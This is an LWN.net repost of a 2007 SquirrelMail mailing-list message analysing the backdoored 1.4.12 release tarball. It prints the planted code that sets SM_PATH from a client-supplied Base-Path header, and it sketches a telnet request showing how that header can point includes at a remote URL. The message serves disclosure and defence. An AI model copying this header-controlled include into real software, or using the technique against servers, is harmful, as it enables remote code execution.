@@ -1,0 +1,184 @@
+        <!DOCTYPE html>
+        <html lang="en">
+        <head><title>Re: SECURITY: 1.4.12 Package Compromise [LWN.net]</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+<meta property="og:title" content="Re: SECURITY: 1.4.12 Package Compromise">
+<meta property="og:site_name" content="LWN.net">
+<meta property="og:type" content="article">
+<meta property="og:description" content=" From:     	      'Uwe Schindler' &amp;lt;thetaphi-AT-php.net&amp;gt; To:     	      &amp;lt;squirrelmail-d [...]">
+<meta HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
+<META NAME="robots" CONTENT="noai, noimageai">
+        <link rel="icon" href="https://static.lwn.net/images/favicon.png"
+              type="image/png">
+        <link rel="alternate" type="application/rss+xml" title="LWN.net headlines" href="https://lwn.net/headlines/rss">
+        <link rel="stylesheet" href="/CSS/lwn-v1">
+<style>div.MakeALink { display: none }</style>
+
+        
+        </head>
+        <body>
+        <a name="t"></a>
+<div id="menu"><a href="/" aria-label="Return to the front page">
+            <img src="https://static.lwn.net/images/logo/barepenguin-70.webp" class="logo"
+                 border="0" alt="LWN.net Logo">
+            <span class="logo">LWN<br>.net</span>
+            <span class="logobl">News from the source</span></a>
+            <a href="/" aria-label="Return to the front page">
+            <img src="https://static.lwn.net/images/lcorner-ss.png" class="sslogo"
+                 border="0" alt="LWN"></a><div class="navmenu-container">
+           <ul class="navmenu">
+        <li><a class="navmenu" href="#t"><b>Content</b></a><ul><li><a href="/current/">Weekly Edition</a></li><li><a href="/Archives/">Archives</a></li><li><a href="/Search/">Search</a></li><li><a href="/Kernel/">Kernel</a></li><li><a href="/Security/">Security</a></li><li><a href="/Calendar/">Events calendar</a></li><li><a href="/Comments/unread">Unread comments</a></li><li><hr></li><li><a href="/op/FAQ.lwn">LWN FAQ</a></li><li><a href="/op/AuthorGuide.lwn">Write for us</a></li></ul></li>
+</ul></div>
+</div> <!-- menu -->
+<div class="topnav-spacer"></div>
+<div class="top-banner not-print"><!-- no top ad served --></div>
+<div class="topnav-container">
+<div class="not-handset"><form action="https://lwn.net/Login/" method="post" name="loginform"
+                 class="loginform">
+        <label><b>User:</b> <input type="text" name="uname" value="" size="8" id="uc" /></label> 
+		<label><b>Password:</b> <input type="password" name="pword" size="8" id="pc" /></label> <input type="hidden" name="target" value="/Articles/262691/" /> <input type="submit" name="submit" value="Log in" /></form> |
+           <form action="https://lwn.net/subscribe/" method="post" class="loginform">
+           <input type="submit" name="submit" value="Subscribe" />
+           </form> |
+           <form action="https://lwn.net/Login/newaccount" method="post" class="loginform">
+           <input type="submit" name="submit" value="Register" />
+           </form>
+        </div>
+               <div class="handset-only">
+               <a href="/Login/"><b>Log in</b></a> /
+               <a href="/subscribe/"><b>Subscribe</b></a> /
+               <a href="/Login/newaccount"><b>Register</b></a>
+               </div>
+               </div><div class="maincolumn flexcol">
+<div class="middlecolumn">
+<div class="PageHeadline">
+<h1>Re: SECURITY: 1.4.12 Package Compromise</h1>
+<div class="Byline">[Posted December 19, 2007 by corbet]
+               <p>
+               </div>
+</div>
+<div class="ArticleText"><main>
+<table>
+<tr><td valign="top"><b>From</b>:</td>
+    	     <td>&nbsp;</td><td valign="top">"Uwe Schindler" &lt;thetaphi-AT-php.net&gt;</td></tr>
+<tr><td valign="top"><b>To</b>:</td>
+    	     <td>&nbsp;</td><td valign="top">&lt;squirrelmail-devel-AT-lists.sourceforge.net&gt;,
+ "'Jon Angliss'" &lt;jon-AT-squirrelmail.org&gt;</td></tr>
+<tr><td valign="top"><b>Subject</b>:</td>
+    	     <td>&nbsp;</td><td valign="top">Re: SECURITY: 1.4.12 Package Compromise</td></tr>
+<tr><td valign="top"><b>Date</b>:</td>
+    	     <td>&nbsp;</td><td valign="top">Fri, 14 Dec 2007 17:55:28 +0100</td></tr>
+<tr><td valign="top"><b>Message-ID</b>:</td>
+    	     <td>&nbsp;</td><td valign="top">&lt;000901c83e72$2164b0e0$0201a8c0@VEGA&gt;</td></tr>
+
+</table><p><pre>
+Hallo Jon,
+
+If found your announcement in a newsticker (heise online) today.
+
+<font class="QuotedText">&gt; Further investigations show that the modifications to the code should
+</font><font class="QuotedText">&gt; have little to no impact at this time.  Modifications seemed to be
+</font><font class="QuotedText">&gt; based around a PHP global variable which we cannot track down.  The
+</font><font class="QuotedText">&gt; changes made will most likely generate an error, rather than a
+</font><font class="QuotedText">&gt; compromise of a system in the event the code does get executed.
+</font>
+Diffing the the compromised source and the orginal source I found out that
+there was the following code added to the source tarball:
+
+/** set the value of the base path */
+if (isset($_SERVER['HTTP_BASE_PATH'])) {
+    define('SM_PATH',$_SERVER['HTTP_BASE_PATH']);
+}
+
+This is really a important security issue! By first looking on it, you will
+think there is no standard variable named "'HTTP_BASE_PATH" -- so no
+problem! - that's true, but you should know, how HTTP_XXX variables are
+generated by webservers.
+
+This variables come from the original CGI specs
+(<a href="http://hoohoo.ncsa.uiuc.edu/cgi/env.html">http://hoohoo.ncsa.uiuc.edu/cgi/env.html</a>): "In addition to these,
+the header lines received from the client, if any, are placed into
+the environment with the prefix HTTP_ followed by the header name.
+Any - characters in the header name are changed to _ characters. The
+server may exclude any headers which it has already processed, such
+as Authorization, Content-type, and Content-length. If necessary, the
+server may choose to exclude any or all of these headers if including
+them would exceed any system environment limits."
+
+Apache or other webservers mostly do not run PHP as CGI but PHP works
+according to the CGI specs. This is where variables like HTTP_USER_AGENT or
+HTTP_HOST or HTTP_COOKIE come from. They are not explicitely generated by
+the webserver, they are sent by the client as HTTP headers and transformed
+to environment variables in a way, the CGI spec specifies (in PHP they are
+copied to $_SERVER).
+
+By this you can change the constant "SM_PATH" by issuing a HTTP request e.g.
+with telnet:
+
+<font class="QuotedText">&gt; telnet www.example.org 80
+</font>GET / HTTP/1.1
+Connection: close
+User-Agent: test/1.0
+Base-Path: ************************
+
+Where *********** could for example be a remote URL! Which leads to remote
+code execution. So this is a very serious security flaw tarned very good! It
+seems that you can modify an internal constant of Squirrel that is important
+and used in all includes:
+
+e.g.:
+require_once(SM_PATH . 'config/config.php');
+
+P.S.: You can test this with a simple phpinfo() page and requesting it with
+telnet/netcat with custom headers, like I done.
+
+-----
+Uwe Schindler
+thetaphi@php.net - <a href="http://www.php.net">http://www.php.net</a>
+NSAPI SAPI developer
+Bremen, Germany
+
+
+
+-------------------------------------------------------------------------
+SF.Net email is sponsored by:
+Check out the new SourceForge.net Marketplace.
+It's the best place to buy or sell services
+for just about anything Open Source.
+<a href="http://ad.doubleclick.net/clk;164216239;13503038;w?http://sf.net/marketplace">http://ad.doubleclick.net/clk;164216239;13503038;w?http:/...</a>
+-----
+squirrelmail-devel mailing list
+Posting guidelines: <a href="http://squirrelmail.org/postingguidelines">http://squirrelmail.org/postingguidelines</a>
+List address: squirrelmail-devel@lists.sourceforge.net
+List archives: <a href="http://news.gmane.org/gmane.mail.squirrelmail.devel">http://news.gmane.org/gmane.mail.squirrelmail.devel</a>
+List info (subscribe/unsubscribe/change options):
+<a href="https://lists.sourceforge.net/lists/listinfo/squirrelmail-devel">https://lists.sourceforge.net/lists/listinfo/squirrelmail...</a>
+
+
+</pre>
+<br clear="all"><hr width="60%%" align="left">
+            <form action="/Login/" method="post">
+            <input type="hidden" name="target" value="/Articles/262691/" />
+            <input type="submit" name="login" value="Log in" /> to post comments
+            <p>
+        <p><a name="Comments"></a>
+
+</main></div> <!-- ArticleText -->
+</div> <!-- middlecolumn -->
+<div class="rightcol not-print">
+<!-- no side ad served -->
+</div>
+</div> <!-- maincolumn -->
+
+            <br clear="all">
+            <center>
+            <P>
+            <span class="ReallySmall">
+            Copyright &copy; 2007, Eklektix, Inc.<BR>
+            
+            Comments and public postings are copyrighted by their creators.<br>
+            Linux  is a registered trademark of Linus Torvalds<br>
+            </span>
+            </center>
+            
+            </body></html>
